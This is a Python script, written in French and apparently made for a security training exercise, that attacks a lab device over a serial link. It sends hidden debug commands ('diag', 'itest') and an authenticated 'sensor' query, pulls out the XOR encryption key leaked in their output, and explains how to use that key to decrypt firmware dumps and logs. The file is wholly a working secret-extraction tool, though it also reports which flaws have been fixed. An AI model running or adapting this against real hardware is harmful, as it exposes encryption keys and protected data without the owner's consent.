#!/usr/bin/env python3
"""
diag_leak.py — Extraction de secrets via commandes de debug (VH7, VH9)
GUARDIA B1 — Script War Day, objectif A11

Principe :
    Le firmware contient des commandes de debug non documentees ("diag",
    "itest") et des fuites d'information dans la commande "sensor".

    "diag" affiche la cle XOR (CAL:XX) et l'etat d'authentification.
    "sensor" affiche la cle XOR deguisee en mesure de courant (IREF).

    Ces informations permettent de dechiffrer les logs XOR et les
    trames FWDUMP sans connaitre la cle.

    CWE-489 (Active Debug Code)
    Ref : Juniper ScreenOS CVE-2015-7755 (2015)

Usage :
    python diag_leak.py COM3
    python diag_leak.py COM3 --with-sensor --pin 0000
"""

import serial
import time
import sys
import re
import argparse


def ouvrir_port(port, baud=115200, timeout=2.0):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(0.3)
        ser.reset_input_buffer()
        return ser
    except serial.SerialException as e:
        print(f"[!] Impossible d'ouvrir {port} : {e}")
        sys.exit(1)


def envoyer_commande(ser, commande, attente=1.0):
    ser.reset_input_buffer()
    for c in commande:
        ser.write(c.encode())
        time.sleep(0.02)
    ser.write(b"\r\n")
    time.sleep(attente)
    reponse = ser.read(ser.in_waiting or 1024).decode(errors="replace")
    return reponse


def main():
    parser = argparse.ArgumentParser(
        description="Debug Leak — extraction secrets via diag/itest/sensor (VH7, VH9)"
    )
    parser.add_argument("port", help="Port serie de la cible (ex: COM3)")
    parser.add_argument("--with-sensor", action="store_true",
                        help="Tester aussi 'sensor' (necessite auth)")
    parser.add_argument("--pin", default=None,
                        help="PIN pour se connecter (requis avec --with-sensor)")
    args = parser.parse_args()

    print("=" * 55)
    print("  DEBUG LEAK — BlackBox B1 GUARDIA")
    print("=" * 55)
    print(f"  Port   : {args.port}")
    print(f"  Cible  : VH7 (debug cmd) + VH9 (sensor leak)")
    print("=" * 55)
    print()

    ser = ouvrir_port(args.port)

    # Prompt initial
    envoyer_commande(ser, "", attente=0.5)

    xor_key_diag = None
    xor_key_sensor = None
    auth_state = None
    uptime = None

    # ---- Test DIAG (VH7) ----
    print("[*] Test commande 'diag' (VH7 — CWE-489)...")
    rep = envoyer_commande(ser, "diag", attente=1.0)

    cal_match = re.search(r'CAL:([0-9A-Fa-f]{2})', rep)
    up_match = re.search(r'UP:(\d+)', rep)
    st_match = re.search(r'ST:(\d)(\d)', rep)

    if cal_match:
        xor_key_diag = int(cal_match.group(1), 16)
        print(f"    [+] CAL:{cal_match.group(1)} => XOR_KEY = 0x{xor_key_diag:02X} ({xor_key_diag})")
    else:
        print(f"    [-] Commande 'diag' non reconnue ou supprimee")

    if up_match:
        uptime = int(up_match.group(1))
        print(f"    [+] UP:{uptime}s => uptime du firmware")

    if st_match:
        connecte = int(st_match.group(1))
        sudo = int(st_match.group(2))
        auth_state = (connecte, sudo)
        labels = {(0, 0): "deconnecte", (1, 0): "connecte", (1, 1): "sudo"}
        print(f"    [+] ST:{connecte}{sudo} => {labels.get((connecte, sudo), '?')}")

    print()

    # ---- Test ITEST ----
    print("[*] Test commande 'itest' (commande cachee)...")
    rep = envoyer_commande(ser, "itest", attente=1.0)

    itest_match = re.search(r'ITEST:\s*up=(\d+)s\s+cnt=(\d+)\s+st=(\d+)', rep)
    if itest_match:
        print(f"    [+] uptime={itest_match.group(1)}s, logs={itest_match.group(2)}, auth={itest_match.group(3)}")
    elif "inconnue" in rep.lower():
        print(f"    [-] Commande 'itest' supprimee")
    else:
        print(f"    [?] Reponse inattendue : {rep.strip()[:60]}")

    print()

    # ---- Test SENSOR (VH9) — necessite auth ----
    if args.with_sensor:
        if args.pin:
            print(f"[*] Connexion avec PIN {args.pin}...")
            rep = envoyer_commande(ser, f"login {args.pin}", attente=1.5)
            if "reussie" not in rep.lower():
                print(f"    [!] Connexion echouee : {rep.strip()[:60]}")
                print("    Impossible de tester 'sensor' sans auth.")
                ser.close()
                return
            print(f"    [+] Connexion reussie")
            print()

        print("[*] Test commande 'sensor' (VH9 — CWE-209)...")
        rep = envoyer_commande(ser, "sensor", attente=1.5)

        iref_match = re.search(r'SENSOR:IREF=(\d+)\.(\d+)mA', rep)
        if iref_match:
            partie_ent = int(iref_match.group(1))
            partie_dec = int(iref_match.group(2))
            xor_key_sensor = partie_ent * 100 + partie_dec
            print(f"    [+] SENSOR:IREF={partie_ent}.{partie_dec:02d}mA")
            print(f"         => Valeur numerique = {xor_key_sensor}")
            print(f"         => XOR_KEY = 0x{xor_key_sensor:02X} ({xor_key_sensor})")
        else:
            print(f"    [-] Pas de ligne IREF dans la sortie sensor")
            print(f"        (VH9 corrigee ou commande inaccessible)")

        if args.pin:
            envoyer_commande(ser, "logout", attente=0.5)

    print()

    # ---- Rapport final ----
    print("=" * 55)
    print("  RAPPORT")
    print("=" * 55)

    secrets_trouves = []

    if xor_key_diag is not None:
        secrets_trouves.append(("diag (VH7)", xor_key_diag))
        print(f"  [+] VH7 PRESENTE — 'diag' actif, XOR_KEY = 0x{xor_key_diag:02X}")
    else:
        print(f"  [v] VH7 CORRIGEE — 'diag' supprime ou desactive")

    if xor_key_sensor is not None:
        secrets_trouves.append(("sensor (VH9)", xor_key_sensor))
        print(f"  [+] VH9 PRESENTE — IREF leak, XOR_KEY = 0x{xor_key_sensor:02X}")
    elif args.with_sensor:
        print(f"  [v] VH9 CORRIGEE — pas de fuite IREF dans sensor")

    if xor_key_diag is not None and xor_key_sensor is not None:
        if xor_key_diag == xor_key_sensor:
            print(f"  [+] CROSS-VALIDATION OK — les deux sources confirment XOR_KEY = 0x{xor_key_diag:02X}")
        else:
            print(f"  [!] DIVERGENCE — diag=0x{xor_key_diag:02X}, sensor=0x{xor_key_sensor:02X}")

    if secrets_trouves:
        key = secrets_trouves[0][1]
        print()
        print(f"  Usage de la cle pour dechiffrer :")
        print(f"    data_clair[i] = data_chiffre[i] ^ 0x{key:02X}")
        print(f"    Appliquer a la sortie de 'fwdump' ou aux logs en RAM.")
    else:
        print()
        print(f"  Aucun secret recupere. Passer a une autre attaque.")

    print()
    ser.close()


if __name__ == "__main__":
    main()
